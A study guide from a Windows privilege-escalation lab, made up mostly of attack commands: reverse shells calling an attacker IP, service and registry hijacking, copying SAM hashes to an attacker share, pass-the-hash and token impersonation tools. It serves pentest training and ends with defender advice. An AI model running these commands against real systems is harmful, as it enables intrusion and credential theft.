# 🪟 Windows 10 Privilege Escalation - Complete Study Guide

> 🎯 Comprehensive reference for Windows privilege escalation techniques based on TryHackMe OSCP-level content

---

## 📋 Table of Contents

- ⚙️ Service Exploits
- 📝 Registry Exploits
- 🔍 Password Mining
- 📅 Scheduled Tasks
- 🖥️ GUI Applications
- 🚀 Startup Applications
- 🎭 Token Impersonation
- 🛠️ Privilege Escalation Tools
- 📚 Key Takeaways


---

### 🔄 Reverse Shell Setup

**Generate reverse shell executable:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

---

### 📁 File Transfer via SMB

**On Kali - Start SMB server:**

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

**On Windows - Copy file:**

```cmd
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

---

### 🧪 Test Reverse Shell

**Setup listener:**

```bash
sudo nc -nvlp 53
```

**Execute on Windows:**

```cmd
C:\PrivEsc\reverse.exe
```

---

## ⚙️ Service Exploits

### 1️⃣ Service - Insecure Service Permissions

> [!note] Concept When a service has misconfigured permissions allowing users to modify its configuration, attackers can change the binary path to execute malicious code with elevated privileges.

#### 🔍 Detection

```cmd
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

Look for `SERVICE_CHANGE_CONFIG` permission.

#### ✅ Verification

```cmd
sc qc daclsvc
```

Check that `SERVICE_START_NAME` shows `LocalSystem`.

#### 🎯 Attack Steps

**Step 1:** Modify service configuration

```cmd
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

**Step 2:** Start listener

```bash
sudo nc -nvlp 53
```

**Step 3:** Start service

```cmd
net start daclsvc
```

> [!success] Result SYSTEM shell obtained through service execution.

---

### 2️⃣ Service - Unquoted Service Path

> [!note] Concept When a service binary path contains spaces but isn't quoted, Windows searches for executables in multiple locations, allowing DLL hijacking or executable replacement.

#### 🔍 Detection

```cmd
sc qc unquotedsvc
```

Look for unquoted `BINARY_PATH_NAME` with spaces.

#### 🔎 Path Analysis

For path: `C:\Program Files\Unquoted Path Service\Common Files\UnquotedPathService.exe`

**Windows searches in this order:**

1. ❌ `C:\Program.exe`
2. ❌ `C:\Program Files\Unquoted.exe`
3. ❌ `C:\Program Files\Unquoted Path.exe`
4. ✅ `C:\Program Files\Unquoted Path Service\Common.exe` ⭐

#### ✅ Verification

```cmd
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

#### 🎯 Attack Steps

**Step 1:** Copy reverse shell to exploitable location

```cmd
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

**Step 2:** Start listener and service

```bash
sudo nc -nvlp 53
```

```cmd
net start unquotedsvc
```

---

### 3️⃣ Service - Weak Registry Permissions

> [!note] Concept If registry entries for services have weak permissions, attackers can modify the ImagePath to point to malicious executables.

#### 🔍 Detection

```cmd
sc qc regsvc
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

#### 🎯 Attack Steps

**Step 1:** Modify registry ImagePath

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

**Step 2:** Start service

```cmd
net start regsvc
```

---

### 4️⃣ Service - Insecure Service Executables

> [!note] Concept When service binary files have weak permissions allowing modification, attackers can replace the executable entirely.

#### 🔍 Detection

```cmd
sc qc filepermsvc
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

#### 🎯 Attack Steps

**Step 1:** Replace service executable

```cmd
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

**Step 2:** Start service

```cmd
net start filepermsvc
```

---

## 📝 Registry Exploits

### 5️⃣ Registry - AutoRuns

> [!note] Concept AutoRun programs execute automatically when users log in. If these executables have weak permissions, they can be replaced with malicious code.

#### 🔍 Detection

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

#### 🎯 Attack Steps

**Step 1:** Replace AutoRun executable

```cmd
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

**Step 2:** Restart Windows VM and establish RDP

```bash
rdesktop MACHINE_IP
```

> [!warning] Important Requires administrator login to trigger the payload.

---

### 6️⃣ Registry - AlwaysInstallElevated

> [!note] Concept When AlwaysInstallElevated is enabled, Windows Installer packages (.msi) run with SYSTEM privileges regardless of the user's privilege level.

#### 🔍 Detection

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both should return `0x1`.

#### 🎯 Attack Steps

**Step 1:** Generate malicious MSI

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

**Step 2:** Transfer to Windows and execute

```cmd
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

---

## 🔍 Password Mining

### 7️⃣ Passwords - Registry

> [!note] Concept Windows registry often contains stored credentials, including AutoLogon passwords and application credentials.

#### 🔎 Search Techniques

```cmd
# General password search
reg query HKLM /f password /t REG_SZ /s

# Specific AutoLogon search
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

#### 🎯 Exploitation

```bash
winexe -U 'admin%password' //MACHINE_IP cmd.exe
```

---

### 8️⃣ Passwords - Saved Credentials

> [!note] Concept Windows can save credentials for network resources, which can be reused with runas.

#### 🔍 Detection

```cmd
cmdkey /list
```

#### 🎯 Attack Steps

**Use saved credentials with runas:**

```cmd
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

> [!info] Note If no credentials are listed, run `C:\PrivEsc\savecred.bat` to refresh.

---

### 9️⃣ Passwords - Security Account Manager (SAM)

> [!note] Concept SAM files contain user password hashes. Backup copies might be accessible and can be used for hash extraction.

#### 🎯 Attack Steps

**Step 1:** Copy SAM and SYSTEM files

```cmd
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

**Step 2:** Extract hashes on Kali

```bash
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```

**Step 3:** Crack NTLM hash

```bash
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

---

### 🔟 Passwords - Pass the Hash

> [!note] Concept Instead of cracking password hashes, they can be used directly for authentication.

#### 🎯 Attack Steps

```bash
pth-winexe -U 'admin%LM:NTLM' //MACHINE_IP cmd.exe
```

---

## 📅 Scheduled Tasks

### 1️⃣1️⃣ Scheduled Tasks Exploitation

> [!note] Concept Scheduled tasks running with elevated privileges can be exploited if their associated scripts are writable.

#### 🔍 Detection

```cmd
# View script content
type C:\DevTools\CleanUp.ps1

# Check write permissions
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

#### 🎯 Attack Steps

**Step 1:** Append malicious command to script

```cmd
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

**Step 2:** Wait for scheduled execution (typically every minute)

---

## 🖥️ GUI Applications

### 1️⃣2️⃣ Insecure GUI Apps

> [!note] Concept GUI applications running with elevated privileges can be exploited through file dialog boxes to spawn privileged command prompts.

#### 🎯 Attack Steps

**Step 1:** RDP as user and double-click "AdminPaint" shortcut

**Step 2:** Verify Paint runs with admin privileges

```cmd
tasklist /V | findstr mspaint.exe
```

**Step 3:** In Paint: File → Open → Navigate to:

```cmd
file://c:/windows/system32/cmd.exe
```

**Step 4:** Press Enter to spawn elevated command prompt

---

## 🚀 Startup Applications

### 1️⃣3️⃣ Startup Apps Exploitation

> [!note] Concept Applications in the Startup directory execute when users log in. If the directory is writable, malicious shortcuts can be placed there.

#### 🔍 Detection

```cmd
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

#### 🎯 Attack Steps

**Step 1:** Create malicious shortcut

```cmd
cscript C:\PrivEsc\CreateShortcut.vbs
```

**Step 2:** Trigger through admin RDP login

```bash
rdesktop -u admin MACHINE_IP
```

---

## 🎭 Token Impersonation

### 1️⃣4️⃣ Token Impersonation - Rogue Potato

> [!note] Concept Service accounts with SeImpersonatePrivilege can be exploited to escalate to SYSTEM using token impersonation attacks.

#### 📋 Prerequisites

- ✅ Service account shell (Local Service, Network Service, etc.)
- ✅ SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

#### ⚙️ Setup

**Step 1:** Set up socat redirector

```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
```

**Step 2:** Get service account shell

```cmd
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

#### 🎯 Attack Steps

```cmd
C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
```

> [!info] Required Privilege SeImpersonatePrivilege (allows this exploit to work)

---

### 1️⃣5️⃣ Token Impersonation - PrintSpoofer

> [!note] Concept Alternative token impersonation technique exploiting the Print Spooler service.

#### 🎯 Attack Steps

**Step 1:** Get service account shell (same as above)

```cmd
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

**Step 2:** Execute PrintSpoofer

```cmd
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

---

## 🛠️ Privilege Escalation Tools

### 1️⃣6️⃣ Automated Detection Tools

> [!note] Concept Several tools have been written to automatically identify potential privilege escalation vectors on Windows systems.

#### 🔧 Available Tools

The following tools are included in the `C:\PrivEsc` directory:

- 🔍 **winPEASany.exe** - Comprehensive privilege escalation checker
- 🔐 **Seatbelt.exe** - Security-oriented host survey tool
- ⚡ **PowerUp.ps1** - PowerShell privilege escalation framework
- 🔨 **SharpUp.exe** - C# port of PowerUp

#### 💻 Usage Examples

```cmd
# Run winPEAS for comprehensive enumeration
C:\PrivEsc\winPEASany.exe

# Run Seatbelt for all security checks
C:\PrivEsc\Seatbelt.exe -group=all

# Run PowerUp (PowerShell)
powershell -ep bypass
Import-Module C:\PrivEsc\PowerUp.ps1
Invoke-AllChecks

# Run SharpUp
C:\PrivEsc\SharpUp.exe
```

> [!warning] Important These tools provide automated detection but manual verification and exploitation is still required.

---

## 📚 Key Takeaways

### 🎯 Common Attack Vectors

1. **🔧 Service Misconfigurations** - Most reliable escalation method
2. **📝 Registry Weaknesses** - Often overlooked by administrators
3. **📅 Scheduled Tasks** - Persistent access opportunity
4. **🎭 Token Impersonation** - Powerful technique for service accounts
5. **🔍 Password Mining** - Multiple sources of credential disclosure

---

### 🔒 Security Implications

- ✅ Always verify service permissions during security assessments
- ✅ Monitor registry keys for sensitive information
- ✅ Implement least privilege principles for all services
- ✅ Regular auditing of scheduled tasks and startup applications
- ✅ Proper configuration of Windows Installer policies

---

### 🛡️ Best Practices for Defenders

- 🔍 Use tools like AccessChk to audit permissions regularly
- 👤 Implement proper service account management
- 📊 Monitor for unusual process executions
- 📝 Enable advanced logging for privilege escalation attempts
- 🔄 Regular security assessments and penetration testing
- 🔐 Apply principle of least privilege consistently
- 🔧 Keep systems updated and patched

---

### 🔎 Detection Strategies

- 📊 Monitor service configuration changes
- 📝 Track registry modifications in sensitive keys
- 📅 Log scheduled task creations and modifications
- 🎭 Monitor token impersonation attempts
- 🔗 Watch for unusual process parent-child relationships
- ⚠️ Alert on privilege escalation tool signatures

---

## 📖 References

- 🎓 **TryHackMe Windows PrivEsc Room** - Source material
- 📚 **Windows Privilege Escalation for OSCP and Beyond** - Tib3rius Course
- 🔧 **Local Privilege Escalation Workshop** - Sagi Shahar
- 📘 **Microsoft Documentation** - Service and Registry security
- 🎯 **MITRE ATT&CK Framework** - T1068 (Exploitation for Privilege Escalation)

---

## ⚠️ Legal Disclaimer

> [!danger] Ethical Use Only This guide is for educational purposes and authorized penetration testing only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

## 🗺️ Quick Reference Matrix

|Technique|Difficulty|Detection|Impact|Persistence|
|---|---|---|---|---|
|Insecure Service Permissions|⭐⭐|Medium|High|Yes|
|Unquoted Service Path|⭐⭐⭐|Low|High|Yes|
|Weak Registry Permissions|⭐⭐|Medium|High|Yes|
|AlwaysInstallElevated|⭐|Easy|High|No|
|Token Impersonation|⭐⭐⭐⭐|High|High|No|
|Scheduled Tasks|⭐⭐|Medium|High|Yes|
|GUI Apps|⭐|Easy|Medium|No|
|Startup Apps|⭐⭐|Medium|High|Yes|

---

**Tags:** #windows #privesc #pentesting #oscp #redteam #security

**Last Updated:** 2025-10-29